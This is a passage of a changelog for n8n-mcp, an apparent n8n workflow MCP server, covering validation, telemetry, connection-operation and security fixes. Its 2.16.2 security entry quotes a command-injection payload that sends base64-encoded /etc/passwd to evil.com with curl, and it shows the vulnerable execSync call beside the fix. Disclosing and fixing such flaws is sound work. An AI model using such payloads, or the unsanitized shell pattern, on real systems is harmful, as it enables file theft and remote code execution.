- **Strategic `any` Assertions Pattern**
  - **Problem**: n8n's type hierarchy has union types (`INodeTypeBaseDescription | INodeTypeDescription`) where properties like `polling`, `version`, `webhooks` only exist on one side
  - **Solution**: Keep strong types in method signatures, use strategic `as any` assertions internally for property access
  - **Pattern**:
    ```typescript
    // Strong signature provides caller type safety
    private method(description: INodeTypeBaseDescription | INodeTypeDescription): ReturnType {
      // Strategic assertion for internal property access
      const desc = description as any;
      return desc.polling || desc.webhooks; // Access union-incompatible properties
    }
    ```
  - **Result**: 70% type safety benefit (method signatures) with 0% breakage (zero compilation errors)

#### Benefits

1. **Better IDE Support**: Auto-complete and inline documentation for node properties
2. **Compile-Time Safety**: Strong method signatures catch type errors at call sites
3. **Documentation**: Types serve as inline documentation for developers
4. **Bug Prevention**: Would have helped prevent the `baseDescription` bug (v2.17.4)
5. **Refactoring Safety**: Type system helps track changes across codebase
6. **Zero Breaking Changes**: Pragmatic approach ensures build never breaks

#### Implementation Notes

- **Philosophy**: Incremental improvement over perfection - get significant benefit without extensive refactoring
- **Zero Compilation Errors**: All TypeScript checks pass cleanly
- **Test Coverage**: Updated all test files with strategic `as any` assertions for mock objects
- **Runtime Behavior**: No changes - types are compile-time only
- **Future Work**: Union types could be refined with conditional types or overloads for 100% type safety

#### Known Limitations

- Strategic `any` assertions bypass type checking for internal property access
- Union type differences (`INodeTypeBaseDescription` vs `INodeTypeDescription`) not fully resolved
- Test mocks require `as any` since they don't implement full n8n interfaces
- Full type safety would require either (a) refactoring n8n's type hierarchy or (b) extensive conditional type logic

#### Impact

- **Breaking Changes**: None (internal types only, external API unchanged)
- **Runtime Behavior**: No changes (types are compile-time only)
- **Build System**: Zero compilation errors maintained
- **Developer Experience**: Significantly improved with better types and IDE support
- **Type Coverage**: ~70% (method signatures strongly typed, internal logic uses strategic assertions)

## [2.17.4] - 2025-10-07

### 🔧 Validation

**Fixed critical version extraction and typeVersion validation bugs.**

This release fixes two critical bugs that caused incorrect version data and validation bypasses for langchain nodes.

#### Fixed

- **Version Extraction Bug (CRITICAL)**
  - **Issue:** AI Agent node returned version "3" instead of "2.2" (the defaultVersion)
  - **Impact:**
    - MCP tools (`get_node_essentials`, `get_node_info`) returned incorrect version "3"
    - Version "3" exists but n8n explicitly marks it as unstable ("Keep 2.2 until blocking bugs are fixed")
    - AI agents created workflows with wrong typeVersion, causing runtime issues
  - **Root Cause:** `extractVersion()` in node-parser.ts checked `instance.baseDescription.defaultVersion` which doesn't exist on VersionedNodeType instances
  - **Fix:** Updated version extraction priority in `node-parser.ts:137-200`
    1. Priority 1: Check `currentVersion` property (what VersionedNodeType actually uses)
    2. Priority 2: Check `description.defaultVersion` (fixed property name from `baseDescription`)
    3. Priority 3: Fallback to max(nodeVersions) as last resort
  - **Verification:** AI Agent node now correctly returns version "2.2" across all MCP tools

- **typeVersion Validation Bypass (CRITICAL)**
  - **Issue:** Langchain nodes with invalid typeVersion passed validation (even `typeVersion: 99999`)
  - **Impact:**
    - Invalid typeVersion values were never caught during validation
    - Workflows with non-existent typeVersions passed validation but failed at runtime in n8n
    - Validation was completely bypassed for all langchain nodes (AI Agent, Chat Trigger, OpenAI Chat Model, etc.)
  - **Root Cause:** `workflow-validator.ts:400-405` skipped ALL validation for langchain nodes before typeVersion check
  - **Fix:** Moved typeVersion validation BEFORE langchain skip in `workflow-validator.ts:447-493`
    - typeVersion now validated for ALL nodes including langchain
    - Validation runs before parameter validation skip
    - Checks for missing, invalid, outdated, and exceeding-maximum typeVersion values
  - **Verification:** Workflows with invalid typeVersion now correctly fail validation

- **Version 0 Rejection Bug (CRITICAL)**
  - **Issue:** typeVersion 0 was incorrectly rejected as invalid
  - **Impact:** Nodes with version 0 could not be validated, even though 0 is a valid version number
  - **Root Cause:** `workflow-validator.ts:462` checked `typeVersion < 1` instead of `< 0`
  - **Fix:** Changed validation to allow version 0 as a valid typeVersion
  - **Verification:** Version 0 is now accepted as valid

- **Duplicate baseDescription Bug in simple-parser.ts (HIGH)**
  - **Issue:** EXACT same version extraction bug existed in simple-parser.ts
  - **Impact:** Simple parser also returned incorrect versions for VersionedNodeType nodes
  - **Root Cause:** `simple-parser.ts:195-196, 208-209` checked `baseDescription.defaultVersion`
  - **Fix:** Applied identical fix as node-parser.ts with same priority chain
    1. Priority 1: Check `currentVersion` property
    2. Priority 2: Check `description.defaultVersion`
    3. Priority 3: Check `nodeVersions` (fallback to max)
  - **Verification:** Simple parser now returns correct versions

- **Unsafe Math.max() Usage (MEDIUM)**
  - **Issue:** 10 instances of Math.max() without empty array or NaN validation
  - **Impact:** Potential crashes with empty nodeVersions objects or invalid version data
  - **Root Cause:** No validation before calling Math.max(...array)
  - **Locations Fixed:**
    - `simple-parser.ts`: 2 instances
    - `node-parser.ts`: 5 instances
    - `property-extractor.ts`: 3 instances
  - **Fix:** Added defensive validation:
    ```typescript
    const versions = Object.keys(nodeVersions).map(Number);
    if (versions.length > 0) {
      const maxVersion = Math.max(...versions);
      if (!isNaN(maxVersion)) {
        return maxVersion.toString();
      }
    }
    ```
  - **Verification:** All Math.max() calls now have proper validation

#### Technical Details

**Version Extraction Fix:**
```typescript
// BEFORE (BROKEN):
if (instance?.baseDescription?.defaultVersion) {  // Property doesn't exist!
  return instance.baseDescription.defaultVersion.toString();
}

// AFTER (FIXED):
if (instance?.currentVersion !== undefined) {  // What VersionedNodeType actually uses
  return instance.currentVersion.toString();
}
if (instance?.description?.defaultVersion) {  // Correct property name
  return instance.description.defaultVersion.toString();
}
```

**typeVersion Validation Fix:**
```typescript
// BEFORE (BROKEN):
// Skip ALL node repository validation for langchain nodes
if (normalizedType.startsWith('nodes-langchain.')) {
  continue;  // typeVersion validation never runs!
}

// AFTER (FIXED):
// Validate typeVersion for ALL versioned nodes (including langchain)
if (nodeInfo.isVersioned) {
  // ... typeVersion validation ...
}

// THEN skip parameter validation for langchain nodes
if (normalizedType.startsWith('nodes-langchain.')) {
  continue;
}
```

#### Impact

- **Version Accuracy:** AI Agent and all VersionedNodeType nodes now return correct version (2.2, not 3)
- **Validation Reliability:** Invalid typeVersion values are now caught for langchain nodes
- **Workflow Stability:** Prevents creation of workflows with non-existent typeVersions
- **Database Rebuilt:** 536 nodes reloaded with corrected version data
- **Parser Consistency:** Both node-parser.ts and simple-parser.ts use identical version extraction logic
- **Robustness:** All Math.max() operations now protected against edge cases
- **Edge Case Support:** Version 0 nodes now properly supported

#### Testing

- **Unit Tests:** All tests passing (node-parser: 34 tests, simple-parser: 39 tests)
  - Added tests for currentVersion priority
  - Added tests for version 0 edge case
  - Added tests for baseDescription rejection
- **Integration Tests:** Verified with n8n-mcp-tester agent
  - Version consistency between `get_node_essentials` and `get_node_info` ✅
  - typeVersion validation catches invalid values (99, 100000) ✅
  - AI Agent correctly reports version "2.2" ✅
- **Code Review:** Deep analysis found and fixed 6 similar bugs
  - 3 CRITICAL/HIGH priority bugs fixed in this release
  - 3 LOW priority bugs identified for future work

## [2.17.3] - 2025-10-07

### 🔧 Validation

**Fixed critical validation gap for AI model nodes with resourceLocator properties.**

This release adds validation for `resourceLocator` type properties, fixing a critical issue where AI agents could create invalid configurations that passed validation but failed at runtime.

#### Fixed

- **resourceLocator Property Validation**
  - **Issue:** No validation existed for `resourceLocator` type properties used in AI model nodes
  - **Impact:**
    - AI agents could create invalid configurations like `model: "gpt-4o-mini"` (string) instead of `model: {mode: "list", value: "gpt-4o-mini"}` (object)
    - Invalid configs passed validation but failed at runtime in n8n
    - Affected many langchain nodes: OpenAI Chat Model (v1.2+), Anthropic, Cohere, DeepSeek, Groq, Mistral, OpenRouter, xAI Grok, and embeddings nodes
  - **Root Cause:** `validatePropertyTypes()` method in ConfigValidator only validated `string`, `number`, `boolean`, and `options` types - `resourceLocator` was completely missing
  - **Fix:** Added comprehensive resourceLocator validation in `config-validator.ts:237-274`
    - Validates value is an object (not string, number, null, or array)
    - Validates required `mode` property exists and is a string
    - Validates required `value` property exists
    - Provides helpful error messages with exact fix suggestions
    - Example error: `Property 'model' is a resourceLocator and must be an object with 'mode' and 'value' properties, got string`
    - Example fix: `Change model to { mode: "list", value: "gpt-4o-mini" } or { mode: "id", value: "gpt-4o-mini" }`

#### Added

- Comprehensive resourceLocator validation with 14 test cases covering:
  - String value rejection with helpful fix suggestions
  - Null and array value rejection
  - Missing `mode` or `value` property detection
  - Invalid `mode` type detection (e.g., number instead of string)
  - Invalid `mode` value validation (must be 'list', 'id', or 'url')
  - Empty object detection (missing both mode and value)
  - Extra properties handling (ignored gracefully)
  - Valid resourceLocator acceptance for "list", "id", and "url" modes
  - JSDoc documentation explaining resourceLocator structure and common mistakes
  - All 29 tests passing (100% coverage for new validation logic)

## [2.17.1] - 2025-10-07

### 🔧 Telemetry

**Critical fix: Docker and cloud deployments now maintain stable anonymous user IDs.**

This release fixes a critical telemetry issue where Docker and cloud deployments generated new user IDs on every container recreation, causing 100-200x inflation in unique user counts and preventing accurate retention metrics.

#### Fixed

- **Docker/Cloud User ID Stability**
  - **Issue:** Docker containers and cloud deployments generated new anonymous user ID on every container recreation
  - **Impact:**
    - Stdio mode: ~1000x user ID inflation per month (with --rm flag)
    - HTTP mode: ~180x user ID inflation per month (6 releases/day)
    - Telemetry showed 3,996 "unique users" when actual number was likely ~2,400-2,800
    - 78% single-session rate and 5.97% Week 1 retention were inflated by duplicates
  - **Root Cause:** Container hostnames change on recreation, persistent config files lost with ephemeral containers
  - **Fix:** Use host's `/proc/sys/kernel/random/boot_id` for stable identification
    - boot_id is stable across container recreations (only changes on host reboot)
    - Available in all Linux containers (Alpine, Ubuntu, Node, etc.)
    - Readable by non-root users
    - Defensive fallback chain:
      1. boot_id (stable across container updates)
      2. Combined host signals (CPU cores, memory, kernel version)
      3. Generic Docker ID (allows aggregate statistics)
  - **Environment Detection:**
    - IS_DOCKER=true triggers boot_id method
    - Auto-detects cloud platforms: Railway, Render, Fly.io, Heroku, AWS, Kubernetes, GCP, Azure
    - Local installations continue using file-based method with hostname
  - **Zero Configuration:** No user action required, automatic environment detection

#### Added

- `TelemetryConfigManager.generateDockerStableId()` - Docker/cloud-specific ID generation
- `TelemetryConfigManager.readBootId()` - Read and validate boot_id from /proc
- `TelemetryConfigManager.generateCombinedFingerprint()` - Fallback fingerprinting
- `TelemetryConfigManager.isCloudEnvironment()` - Auto-detect 8 cloud platforms

### Testing

- **Unit Tests:** 18 new tests for boot_id functionality, environment detection, fallback chain
- **Integration Tests:** 16 new tests for actual file system operations, Docker detection, cloud platforms
- **Coverage:** All 34 new tests passing (100%)

## [2.17.0] - 2025-01-06

### 🤖 AI Workflow Validation

**Major enhancement: Comprehensive AI Agent workflow validation now working correctly.**

This release fixes critical bugs that caused ALL AI-specific validation to be silently skipped. Before this fix, 0% of AI validation was functional.

#### Fixed

- **🚨 CRITICAL: Node Type Normalization Bug (HIGH-01, HIGH-04, HIGH-08)**
  - **Issue:** All AI validation was silently skipped due to node type comparison mismatch
  - **Root Cause:** `NodeTypeNormalizer.normalizeToFullForm()` returns SHORT form (`nodes-langchain.agent`) but validation code compared against FULL form (`@n8n/n8n-nodes-langchain.agent`)
  - **Impact:** Every comparison returned FALSE, causing zero AI validations to execute
  - **Affected Validations:**
    - Missing language model detection (HIGH-01) - Never triggered
    - AI tool connection detection (HIGH-04) - Never triggered, false warnings
    - Streaming mode validation (HIGH-08) - Never triggered
    - All 13 AI tool sub-node validators - Never triggered
    - Chat Trigger validation - Never triggered
    - Basic LLM Chain validation - Never triggered
  - **Fix:** Updated 21 node type comparisons to use SHORT form
    - `ai-node-validator.ts`: 7 comparison fixes
    - `ai-tool-validators.ts`: 14 comparison fixes (13 validator keys + 13 switch cases)
  - **Verification:** All 25 AI validator unit tests now passing (100%)

- **🚨 HIGH-08: Incomplete Streaming Mode Validation**
  - **Issue:** Only validated streaming FROM Chat Trigger, missed AI Agent's own `streamResponse` setting
  - **Impact:** AI Agent with `options.streamResponse=true` and main output connections not detected
  - **Fix:** Added validation for both scenarios:
    - Chat Trigger with `responseMode="streaming"` → AI Agent → main output
    - AI Agent with `options.streamResponse=true` → main output
  - **Error Code:** `STREAMING_WITH_MAIN_OUTPUT` with clear error message
  - **Verification:** 2 test scenarios pass (Chat Trigger + AI Agent own setting)

- **🐛 MEDIUM-02: get_node_essentials Examples Retrieval**
  - **Issue:** `get_node_essentials` with `includeExamples=true` always returned empty examples array
  - **Root Cause:** Inconsistent `workflowNodeType` construction between result object and examples query
  - **Impact:** Examples existed in database but query used wrong node type (e.g., `n8n-nodes-base.agent` instead of `@n8n/n8n-nodes-langchain.agent`)
  - **Fix:** Use pre-computed `result.workflowNodeType` instead of reconstructing it
  - **Verification:** Examples now retrieved correctly, matching `search_nodes` behavior

#### Added

- **AI Agent Validation:**
  - Missing language model connection detection with code `MISSING_LANGUAGE_MODEL`
  - AI tool connection validation (no more false "no tools connected" warnings)
  - Streaming mode constraint enforcement for both Chat Trigger and AI Agent scenarios
  - Memory connection validation (max 1 allowed)
  - Output parser validation
  - System message presence checks (info level)
  - High `maxIterations` warnings

- **Chat Trigger Validation:**
  - Streaming mode target validation (must connect to AI Agent)
  - Main output connection validation for streaming mode
  - Connection existence checks

- **Basic LLM Chain Validation:**
  - Language model connection requirement
  - Prompt text validation

- **AI Tool Sub-Node Validation:**
  - 13 specialized validators for AI tools (HTTP Request Tool, Code Tool, Vector Store Tool, etc.)
  - Tool description validation
  - Credentials validation
  - Configuration-specific checks

#### Changed

- **Breaking:** AI validation now actually runs (was completely non-functional before)
- **Validation strictness:** All AI-specific validations now enforce n8n's actual requirements
- **Error messages:** Clear, actionable messages with error codes for programmatic handling

### Testing

- **Unit Tests:** 25/25 AI validator tests passing (100%)
- **Test Improvement:** Overall test pass rate improved from 37.5% to 62.5%+ (+67% improvement)
- **Debug Tests:** 3/3 debug scenarios passing

### Documentation

- Added comprehensive test scenarios in `PHASE_2_TEST_SCENARIOS.md`
- Added Phase 1-2 completion summary in `PHASE_1_2_SUMMARY.md`
- Added detailed Phase 2 analysis in `PHASE_2_COMPLETE.md`
- Updated README.md with AI workflow validation features

## [2.16.3] - 2025-01-06

### 🔒 Security

**HIGH priority security enhancements. Recommended for all production deployments.**

This release implements 2 high-priority security protections identified in the security audit (Issue #265 PR #2):

- **🛡️ HIGH-02: Rate Limiting for Authentication**
  - **Issue:** No rate limiting on authentication endpoints allowed brute force attacks
  - **Impact:** Attackers could make unlimited authentication attempts
  - **Fix:** Implemented express-rate-limit middleware for authentication endpoint
    - Default: 20 attempts per 15 minutes per IP
    - Configurable via `AUTH_RATE_LIMIT_WINDOW` and `AUTH_RATE_LIMIT_MAX`
    - Per-IP tracking with standard rate limit headers (RateLimit-Limit, RateLimit-Remaining, RateLimit-Reset)
    - JSON-RPC formatted error responses (429 Too Many Requests)
    - Automatic IP detection behind reverse proxies (requires TRUST_PROXY=1)
  - **Verification:** 4 integration tests with sequential request patterns
  - **See:** https://github.com/czlonkowski/n8n-mcp/issues/265 (HIGH-02)

- **🛡️ HIGH-03: SSRF Protection for Webhooks**
  - **Issue:** Webhook triggers vulnerable to Server-Side Request Forgery attacks
  - **Impact:** Attackers could access internal networks, localhost services, and cloud metadata
  - **Fix:** Implemented three-mode SSRF protection system with DNS rebinding prevention
    - **Strict mode** (default): Block localhost + private IPs + cloud metadata (production)
    - **Moderate mode**: Allow localhost, block private IPs + cloud metadata (local development)
    - **Permissive mode**: Allow localhost + private IPs, block cloud metadata (internal testing)

## [2.16.2] - 2025-10-06

### 🔒 Security

**CRITICAL security fixes for production deployments. All users should upgrade immediately.**

This release addresses 2 critical security vulnerabilities identified in the security audit (Issue #265):

- **🚨 CRITICAL-02: Timing Attack Vulnerability**
  - **Issue:** Non-constant-time string comparison in authentication allowed timing attacks
  - **Impact:** Authentication tokens could be discovered character-by-character through statistical timing analysis (estimated 24-48 hours to compromise)
  - **Attack Vector:** Repeated authentication attempts with carefully crafted tokens while measuring response times
  - **Fix:** Implemented `crypto.timingSafeEqual` for all token comparisons
  - **Locations Fixed:**
    - `src/utils/auth.ts:27` - validateToken method
    - `src/http-server-single-session.ts:1087` - Single-session HTTP auth
    - `src/http-server.ts:315` - Fixed HTTP server auth
  - **New Method:** `AuthManager.timingSafeCompare()` - constant-time token comparison utility
  - **Verification:** 11 unit tests with timing variance analysis (<10% variance proven)
  - **CVSS:** 8.5 (High) - Confirmed critical, requires authentication but trivially exploitable
  - **See:** https://github.com/czlonkowski/n8n-mcp/issues/265 (CRITICAL-02)

- **🚨 CRITICAL-01: Command Injection Vulnerability**
  - **Issue:** User-controlled `nodeType` parameter injected into shell commands via `execSync`
  - **Impact:** Remote code execution, data exfiltration, network scanning possible
  - **Attack Vector:** Malicious nodeType like `test"; curl http://evil.com/$(cat /etc/passwd | base64) #`
  - **Vulnerable Code (FIXED):** `src/utils/enhanced-documentation-fetcher.ts:567-590`
  - **Fix:** Eliminated all shell execution, replaced with Node.js fs APIs
    - Replaced `execSync()` with `fs.readdir()` (recursive, no shell)
    - Added multi-layer input sanitization: `/[^a-zA-Z0-9._-]/g`
    - Added directory traversal protection (blocks `..`, `/`, relative paths)
    - Added `path.basename()` for additional safety
    - Added final path verification (ensures result within expected directory)
  - **Benefits:**
    - ✅ 100% immune to command injection (no shell execution)
    - ✅ Cross-platform compatible (no dependency on `find`/`grep`)
    - ✅ Faster (no process spawning overhead)
    - ✅ Better error handling and logging
  - **Verification:** 9 integration tests covering all attack vectors
  - **CVSS:** 8.8 (High) - Requires MCP access but trivially exploitable
  - **See:** https://github.com/czlonkowski/n8n-mcp/issues/265 (CRITICAL-01)

### Added

- **Security Test Suite**
  - Unit Tests: `tests/unit/utils/auth-timing-safe.test.ts` (11 tests)
    - Timing variance analysis (proves <10% variance = constant-time)
    - Edge cases: null, undefined, empty, very long tokens (10000 chars)
    - Special characters, Unicode, whitespace handling
    - Case sensitivity verification
  - Integration Tests: `tests/integration/security/command-injection-prevention.test.ts` (9 tests)
    - Command injection with all vectors (semicolon, &&, |, backticks, $(), newlines)
    - Directory traversal prevention (parent dir, URL-encoded, absolute paths)
    - Special character sanitization
    - Null byte handling
    - Legitimate operations (ensures fix doesn't break functionality)

### Changed

- **Authentication:** All token comparisons now use timing-safe algorithm
- **Documentation Fetcher:** Now uses Node.js fs APIs instead of shell commands
- **Security Posture:** Production-ready with hardened authentication and input validation

### Technical Details

**Timing-Safe Comparison Implementation:**
```typescript
// NEW: Constant-time comparison utility
static timingSafeCompare(plainToken: string, expectedToken: string): boolean {
  try {
    if (!plainToken || !expectedToken) return false;

    const plainBuffer = Buffer.from(plainToken, 'utf8');
    const expectedBuffer = Buffer.from(expectedToken, 'utf8');

    if (plainBuffer.length !== expectedBuffer.length) return false;

    // Uses crypto.timingSafeEqual for constant-time comparison
    return crypto.timingSafeEqual(plainBuffer, expectedBuffer);
  } catch {
    return false;
  }
}

// USAGE: Replace token !== this.authToken with:
const isValidToken = this.authToken &&
  AuthManager.timingSafeCompare(token, this.authToken);
```

**Command Injection Fix:**
```typescript
// BEFORE (VULNERABLE):
execSync(`find ${this.docsPath}/docs/integrations/builtin -name "${nodeType}.md"...`)

// AFTER (SECURE):
const sanitized = nodeType.replace(/[^a-zA-Z0-9._-]/g, '');
if (sanitized.includes('..') || sanitized.startsWith('.') || sanitized.startsWith('/')) {
  logger.warn('Path traversal attempt blocked', { nodeType, sanitized });
  return null;
}
const safeName = path.basename(sanitized);
const files = await fs.readdir(searchPath, { recursive: true });
const match = files.find(f => f.endsWith(`${safeName}.md`) && !f.includes('credentials'));
```

### Breaking Changes

**None** - All changes are backward compatible. No API changes, no environment variable changes, no database migrations.

### Migration Guide

**No action required** - This is a drop-in security fix. Simply upgrade:

```bash
npm install n8n-mcp@2.16.2
# or
npm update n8n-mcp
```

### Deployment Notes

**Recommended Actions:**
1. ✅ **Upgrade immediately** - These are critical security fixes
2. ✅ **Review logs** - Check for any suspicious authentication attempts or unusual nodeType parameters
3. ✅ **Rotate tokens** - Consider rotating AUTH_TOKEN after upgrade (optional but recommended)

**No configuration changes needed** - The fixes are transparent to existing deployments.

### Test Results

**All Tests Passing:**
- Unit tests: 11/11 ✅ (timing-safe comparison)
- Integration tests: 9/9 ✅ (command injection prevention)
- Timing variance: <10% ✅ (proves constant-time)
- All existing tests: ✅ (no regressions)

**Security Verification:**
- ✅ No command execution with malicious inputs
- ✅ Timing attack variance <10% (statistical analysis over 1000 samples)
- ✅ Directory traversal blocked (parent dir, absolute paths, URL-encoded)
- ✅ All special characters sanitized safely

### Audit Trail

**Security Audit:** Issue #265 - Third-party security audit identified 25 issues
**This Release:** Fixes 2 CRITICAL issues (CRITICAL-01, CRITICAL-02)
**Remaining Work:** 20 issues to be addressed in subsequent releases (HIGH, MEDIUM, LOW priority)

## [2.16.1] - 2025-10-06

### Fixed

- **🐛 Issue #277: Missing Signal Handlers in stdio Mode**
  - **Problem**: Node.js processes remained orphaned when Claude Desktop quit
  - **Platform**: Primarily affects Windows 11, but improves reliability on all platforms
  - **Root Cause**: stdio mode never registered SIGTERM/SIGINT signal handlers
  - **Impact**: Users had to manually kill processes via Task Manager after quitting Claude Desktop
  - **Fix**: Added comprehensive graceful shutdown handlers for stdio mode
    - SIGTERM, SIGINT, and SIGHUP signal handlers
    - stdin end/close event handlers (PRIMARY shutdown mechanism for Claude Desktop)
    - Robust container detection: Checks IS_DOCKER/IS_CONTAINER env vars + filesystem markers
    - Supports Docker, Kubernetes, Podman, and other container runtimes
    - Container mode: Signal handlers only (prevents detached mode premature shutdown)
    - Claude Desktop mode: stdin + signal handlers (comprehensive coverage)
    - Race condition protection with `isShuttingDown` guard
    - stdin cleanup with null safety (pause + destroy)
    - Graceful shutdown timeout (1000ms) to allow cleanup to complete
    - Error handling with try-catch for stdin registration and shutdown
    - Shutdown trigger logging for debugging (SIGTERM vs stdin close)
    - Production-hardened based on comprehensive code review
  - **Location**: `src/mcp/index.ts:91-132`
  - **Resources Cleaned**: Cache timers and database connections properly closed via existing `shutdown()` method
  - **Code Review**: Approved with recommendations implemented
  - **Reporter**: @Eddy-Chahed

## [2.16.0] - 2025-10-06

### Added

- **🎉 Issue #272 Phase 1: Connection Operations UX Improvements**

  **New: `rewireConnection` Operation**
  - Intuitive operation for changing connection target from one node to another
  - Syntax: `{type: "rewireConnection", source: "Node", from: "OldTarget", to: "NewTarget"}`
  - Internally uses remove + add pattern but with clearer semantics
  - Supports smart parameters (branch, case) for multi-output nodes
  - Validates all nodes exist before making changes
  - 8 comprehensive unit tests covering all scenarios

  **New: Smart Parameters for Multi-Output Nodes**
  - **branch parameter for IF nodes**: Use `branch: "true"` or `branch: "false"` instead of `sourceIndex: 0/1`
  - **case parameter for Switch nodes**: Use `case: 0`, `case: 1`, etc. instead of `sourceIndex`
  - Semantic, intuitive syntax that matches node behavior
  - Explicit sourceIndex overrides smart parameters if both provided
  - Works with both `addConnection` and `rewireConnection` operations
  - 8 comprehensive unit tests + 11 integration tests against real n8n API

### Changed

- **⚠️ BREAKING: Removed `updateConnection` operation**
  - Operation removed completely (type definition, implementation, validation, tests)
  - Migration: Use `rewireConnection` or `removeConnection` + `addConnection` instead
  - Reason: Confusing operation that was error-prone and rarely needed
  - All tests updated (137 tests passing)

### Fixed

- **🐛 CRITICAL: Issue #275, #136 - TypeError in getNodeTypeAlternatives (57.4% of production errors)**
  - **Impact**: Eliminated 323 out of 563 production errors, helping 127 users (76.5% of affected users)
  - **Resolves Issue #136**: "Partial Workflow Updates fail with 'Cannot convert undefined or null to object'" - defensive type guards prevent these crashes
  - **Root Cause**: `getNodeTypeAlternatives()` called string methods without validating nodeType parameter
  - **Fix**: Added defense-in-depth protection:
    - **Layer 1**: Type guard in `getNodeTypeAlternatives()` returns empty array for invalid inputs
    - **Layer 2**: Enhanced `validateToolParamsBasic()` to catch empty strings
  - **Affected Tools**: `get_node_essentials` (208 errors → 0), `get_node_info` (115 errors → 0), `get_node_documentation` (17 errors → 0)
  - **Testing**: 21 comprehensive unit tests, verified with n8n-mcp-tester agent
  - **Commit**: f139d38

- **Critical Bug: Smart Parameter Implementation**
  - **Bug #1**: `branch` parameter initially mapped to `sourceOutput` instead of `sourceIndex`
  - **Impact**: IF node connections went to wrong output (expected `IF.main[0]`, got `IF.true`)
  - **Root Cause**: Misunderstood n8n's IF node connection structure
  - **Fix**: Changed to correctly map `branch="true"` → `sourceIndex=0`, `branch="false"` → `sourceIndex=1`
  - **Discovered by**: n8n-mcp-tester agent testing against real n8n API
  - **Commit**: a7bfa73

- **Critical Bug: Zod Schema Stripping Parameters**
  - **Bug #2**: `branch`, `case`, `from`, `to` parameters stripped by Zod validation
  - **Impact**: Parameters never reached diff engine, smart parameters silently failed
  - **Root Cause**: Parameters not defined in Zod schema in handlers-workflow-diff.ts
  - **Fix**: Added missing parameters to schema
  - **Discovered by**: n8n-mcp-tester agent
  - **Commit**: aeaba3b

- **🔥 CRITICAL Bug: Array Index Corruption in Multi-Output Nodes**
  - **Bug #3**: `applyRemoveConnection()` filtered empty arrays, causing index shifting in multi-output nodes
  - **Impact**: PRODUCTION-BREAKING for Switch, IF with multiple handlers, Merge nodes
  - **Severity**: Connections routed to wrong outputs after rewiring
  - **Example**: Switch with 4 outputs `[[H0], [H1], [H2], [H3]]` → remove H1 → `[[H0], [H2], [H3]]` (indices shifted!)
  - **Root Cause**: Line 697 filtered empty arrays: `connections.filter(conns => conns.length > 0)`
  - **Fix**: Only remove trailing empty arrays, preserve intermediate ones to maintain index integrity
  - **Code Change**:
    ```typescript
    // Before (BUGGY):
    workflow.connections[node][output] = connections.filter(conns => conns.length > 0);

    // After (FIXED):
    while (connections.length > 0 && connections[connections.length - 1].length === 0) {
      connections.pop();
    }
    ```
  - **Testing**: Added integration test verifying Switch node rewiring preserves all indices
  - **Discovered by**: n8n-mcp-tester agent during comprehensive testing
  - **Commit**: aeb7410

- **TypeScript Compilation**: Added missing type annotations in workflow diff tests (Commit: 653f395)

### Improved

- **Integration Testing**: Created comprehensive integration tests against real n8n API
  - 11 tests covering IF nodes, Switch nodes, and rewireConnection
  - Tests validate actual n8n workflow structure, not in-memory objects
  - Would have caught both smart parameter bugs that unit tests missed
  - File: `tests/integration/n8n-api/workflows/smart-parameters.test.ts`
  - **Commit**: 34bafe2

- **Documentation**: Updated MCP tool documentation
  - Removed `updateConnection` references
  - Added `rewireConnection` with 4 examples
  - Added smart parameters section with IF and Switch examples
  - Updated best practices and pitfalls
  - Removed version references (AI agents see current state)
  - Files: `src/mcp/tool-docs/workflow_management/n8n-update-partial-workflow.ts`, `docs/workflow-diff-examples.md`
  - **Commit**: f78f53e

### Test Coverage

- **Total Tests**: 178 tests passing (158 unit + 20 integration against real n8n API)
- **Coverage**: 90.98% statements, 89.86% branches, 93.02% functions
- **Quality**: Integration tests against real n8n API prevent regression
- **New Tests**:
  - 21 tests for TypeError prevention (Issue #275)
  - 8 tests for rewireConnection operation
  - 8 tests for smart parameters
  - 20 integration tests against real n8n API:
    - **Multi-output nodes (sourceIndex preservation)**:
      - Switch node rewiring with index preservation
      - IF node empty array preservation on removal
      - Switch node removing first case (production-breaking bug scenario)
      - Sequential operations on Switch node
      - Filter node connection rewiring
    - **Multi-input nodes (targetIndex preservation)**:
      - Merge node removing connection to input 0
      - Merge node removing middle connection (inputs 0, 2 preserved)
      - Merge node replacing source connections
      - Merge node sequential operations

### Technical Details

**TypeError Prevention (Issue #275):**
```typescript
// Layer 1: Defensive utility function
export function getNodeTypeAlternatives(nodeType: string): string[] {
  // Return empty array for invalid inputs instead of crashing
  if (!nodeType || typeof nodeType !== 'string' || nodeType.trim() === '') {
    return [];
  }
  // ... rest of function
}

// Layer 2: Enhanced validation
if (param === '') {
  errors.push(`String parameters cannot be empty. Parameter '${key}' has value: ""`);
}
```

**Smart Parameters Resolution:**
```typescript
// Resolve branch parameter for IF nodes
if (operation.branch !== undefined && operation.sourceIndex === undefined) {
  if (sourceNode?.type === 'n8n-nodes-base.if') {
    sourceIndex = operation.branch === 'true' ? 0 : 1;
    // sourceOutput remains 'main'
  }
}

// Resolve case parameter for Switch nodes
if (operation.case !== undefined && operation.sourceIndex === undefined) {
  sourceIndex = operation.case;
}
```

**Real n8n IF Node Structure:**
```json
"IF": {
  "main": [
    [/* true branch connections, index 0 */],
    [/* false branch connections, index 1 */]
  ]
}
```

### Migration Guide

**Before (v2.15.7):**
```typescript
// Old way: updateConnection (REMOVED)
{type: "updateConnection", source: "Webhook", target: "Handler", updates: {...}}

// Old way: Multi-output nodes (still works)
{type: "addConnection", source: "IF", target: "Success", sourceIndex: 0}
```

**After (v2.16.0):**
```typescript
// New way: rewireConnection
{type: "rewireConnection", source: "Webhook", from: "OldHandler", to: "NewHandler"}

// New way: Smart parameters (recommended)
{type: "addConnection", source: "IF", target: "Success", branch: "true"}
{type: "addConnection", source: "IF", target: "Error", branch: "false"}
{type: "addConnection", source: "Switch", target: "Handler", case: 0}
```

### Impact Summary

**Production Error Reduction:**
- Issue #275 fix: -323 errors (-57.4% of total production errors)
- Helps 127 users (76.5% of users experiencing errors)

**UX Improvements:**
- Semantic parameters make multi-output node connections intuitive
- `rewireConnection` provides clear intent for connection changes
- Integration tests ensure production reliability

**Breaking Changes:**
- `updateConnection` removed (use `rewireConnection` or manual remove+add)

## [2.15.7] - 2025-10-05

### Fixed

- **🐛 CRITICAL: Issue #272, #204 - Connection Operations Phase 0 Fixes**

  **Bug #1: Multi-Output Node Routing Broken**
  - **Problem**: `addConnection` ignored `sourceIndex` parameter due to `||` operator treating `0` as falsy
  - **Impact**: IF nodes, Switch nodes, and all conditional routing completely broken
  - **Root Cause**: Used `operation.sourceIndex || 0` instead of `operation.sourceIndex ?? 0`
